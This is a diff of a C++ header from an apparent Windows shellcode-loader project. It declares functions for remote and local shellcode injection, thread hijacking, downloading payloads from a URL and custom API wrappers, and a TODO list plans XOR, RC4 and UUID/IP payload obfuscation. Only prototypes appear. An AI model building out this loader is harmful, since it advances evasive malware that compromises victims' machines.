@@ -7,28 +7,21 @@
 #undef max
 #endif
 
-/* -------- INCLUDES --------*/
-#include <Windows.h>
-#include <cstdarg> 
-#include <stdio.h>
-#include <iostream>
-#include <cstring>
-#include <TlHelp32.h>
-#include <cstdio>
-#include <bcrypt.h>
-//#include <winsock2.h>
-//#include <ws2tcpip.h>
-#include <io.h>
-#include <fcntl.h>
-#include <string>
-#include <locale>
-#include <codecvt>
-#include <csignal>
-#include <stdexcept>
-#include <wchar.h>
-#include <limits>
-using namespace std;
 
+/* --- TODO LIST --- */
+// Implement XOR Encryption 
+// Implement Securing the Encryption Key of XOR
+// Implement Both methods of RC4 encryption
+// Implement MacFuscaion with IPv4/IPV6 addresses 
+// Implement UUID deobfuscation+ Obfuscation 
+// 
+/* -------- INCLUDES --------*/
+
+#include <string>
+#include <codecvt>
+#include <cstdio>
+using namespace std;
+#define _CRT_SECURE_NO_WARNINGS
 
 /* [-------- Global Variables -------] */
 extern char big_string[];
@@ -44,16 +37,7 @@ extern char big_numbers[];
 #define CONTAINING_RECORD(address, type, field) \
     ((type *)((PCHAR)(address) - (ULONG_PTR)(&((type *)0)->field)))
 
-/* For AES Decryption */
-#define KEYSIZE	32
-#define IVSIZE	16
-
-/* Macros for use with the NTAPI */
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
-#define STATUS_NOT_FOUND ((NTSTATUS)0xC0000225L) // Status code for not found
-#define STATUS_DLL_NOT_FOUND ((NTSTATUS)0xC0000135L) // Status code for DLL not found
-
+#include "includes.h"
 /* Macros for Initialise Object Attributs for rockyCreateThread */
 #define InitializeObjectAttributes(p, n, a, r, s) { \
     (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
@@ -73,6 +57,10 @@ HMODULE rockyGetModuleHandle2(IN LPCWSTR szModuleName);
 /* [CUSTOM: rockyGetProcAddress (GetProcAddress)] */
 void* rockyGetProcAddress(HMODULE hModule, const char* functionName);
 
+NTSTATUS rockyVirtualProtect2(HANDLE hProcess, PVOID baseAddress, SIZE_T regionSize, ULONG newProtect, PULONG oldProtect);
+BOOL rockyInjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode);
+
+BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);
 /* [CUSTOM: rockyPrintColor (printf())]*/
 enum ConsoleColor {
 	red = rockyColorBase(RED),
@@ -86,7 +74,8 @@ enum ConsoleColor {
 };
 void rockyPrintColor(ConsoleColor color, const char* format, ...);
 
-/* [CUSTOM: rockyAlloc (Alloc)] */
+
+	/* [CUSTOM: rockyAlloc (Alloc)] */
 NTSTATUS rockyAlloc(const void* data, size_t size, void** outAddress);
 NTSTATUS rockyAlloc(const char* stringData, void** outAddress);
 
@@ -100,12 +89,9 @@ NTSTATUS rockyNtClose(HANDLE handle);
 /* [CUSTOM: rockyPrintAllocated (Show Payload)]*/
 void rockyPrintAllocated(const void* pAddress, size_t size);
 
-/* [CUSTOM rockyObfuscation and GetString (Obfuscator)] */
-string rockyGetString(int offsets[], char* big_string, int sizeof_offset);
-void rockyObfuscation(char* big_string, char* original_string);
 
 /* [CUSTOM convert strings to Wstring] */
-wstring stringToWstring(const string& str);
+std::wstring stringToWstring(const string& str);
 
 /* [CUSTOM: rockyVirtualProtect function] */
 NTSTATUS rockyVirtualProtect(HANDLE hProcess, PVOID baseAddress, SIZE_T regionSize, ULONG newProtect, PULONG oldProtect);
@@ -116,17 +102,47 @@ LPVOID rockyVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWO
 
 BOOL rockyWriteToProcessMemory(HANDLE hProcess, PVOID address, PVOID data, SIZE_T size, SIZE_T* bytesWritten);
 BOOL rockyInjectDLL(HANDLE hProcess, LPWSTR DllName);
-/* [CUSTOM AES functions] */
-BOOL InstallAesDecryption(PAES pAes);
-BOOL InstallAesEncryption(PAES pAes);
-BOOL rockyAes_decrypt(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize);
-BOOL rockyAes_encrypt(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize);
-BOOL rockyUUID_Deobfuscator(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize);
-
 
 
 BOOL rockyGetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess);
 VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize);
 VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size);
+
+void ensureMultipleOfSix(unsigned char*& data, size_t& size);
+
+BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize);
+
+
+BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess);
+
+BOOL PrintProcesses();
+
+BOOL GetRemoteProcessHandleUsingNtQuerySystem(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess);
+
+
+
+
+VOID DummyFunction();
+
+BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize);
+
+
+BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress); 
+
+BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress);
+
+BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);
+
+
+BOOL InjectShellcodeToLocalProcess(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress);
+
+BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread);
+
+
+BOOL HijackThreadAlt(IN HANDLE hThread, IN PVOID pAddress);
+
+
+void HijackProcess();
+
 
 #endif // FUNCTIONS_H
